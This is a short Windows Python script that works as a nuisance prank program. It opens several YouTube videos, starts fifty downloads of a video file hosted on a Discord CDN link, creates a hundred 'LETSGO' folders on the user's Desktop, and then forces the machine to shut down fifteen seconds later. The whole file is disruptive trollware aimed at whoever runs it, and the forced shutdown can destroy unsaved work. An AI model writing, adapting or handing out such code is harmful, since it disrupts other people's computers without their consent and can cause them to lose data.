import os
import time

desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') # set up directories ...

print("LETS GOOOOO!!!! "*50)
# play da videos
os.system("start https://www.youtube.com/watch?v=AGoBVIyo66Y")
os.system("start https://www.youtube.com/watch?v=AGoBVIyo66Y")
os.system("start https://www.youtube.com/watch?v=Ghag7m6jB6Q")
os.system("start https://www.youtube.com/watch?v=63amyCOleOk")
os.system("start https://www.youtube.com/watch?v=n055gLbsMxc")
# flood downloads
for i in range(50):
    os.system("start https://cdn.discordapp.com/attachments/844320843756470282/844570118666190859/letsgo.mkv")

# directory payload
os.chdir(desktop)
for i in range(100):
    os.mkdir("LETSGO" + str(i))

time.sleep(15) # for stuff to load
os.system("shutdown /s")
